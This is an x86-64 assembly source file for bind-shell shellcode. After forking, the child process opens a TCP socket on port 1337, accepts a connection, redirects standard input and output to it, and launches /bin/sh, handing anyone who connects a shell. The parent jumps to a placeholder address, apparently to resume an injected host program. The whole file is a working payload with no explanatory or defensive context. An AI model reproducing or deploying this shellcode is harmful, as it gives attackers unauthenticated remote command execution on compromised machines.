BITS 64

; open up port 1337 with a shell

	; fork
	mov rax, 57
    syscall
	
	test rax, rax
	jne parent

	; socket(PF_INET, SOCK_STREAM, 0)
	mov rax, 41
    xor rdx, rdx
	mov rsi, 0x1
	mov rdi, 0x2
    syscall

	mov r12, rax ; saved the return filedescriptor

	; bind(esi, {AF_NET, htons(1337), 0}, 16)
	mov rax, 49
	mov rcx, 2
	push rdx
	push WORD 0x3905
	push WORD cx
    mov rdx, 16
	mov rsi, rsp
    mov rdi, r12
    syscall

    ; listen
    mov rax, 50
    mov rsi, 4
    mov rdi, r12
    syscall

    ; accept
    mov rax, 43
    xor rdx, rdx
    xor rsi, rsi
    mov rdi, r12
    syscall

    ; dup2 socketfd over stdin, stdout, stderr
    mov rdi, rax
    mov rax, 33
    xor rsi, rsi
    syscall
    mov rax, 33
    inc rsi
    syscall
    mov rax, 33
    inc rsi
    syscall

    mov rax, 59
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    xor rcx, rcx
    push rcx
    mov rdx, rsp
    push rdi
    mov rsi, rsp
    syscall

	; do jump if failure here
	test rax, rax
	jl parent

parent:
	mov rax, 0x0011223344556677
	jmp rax
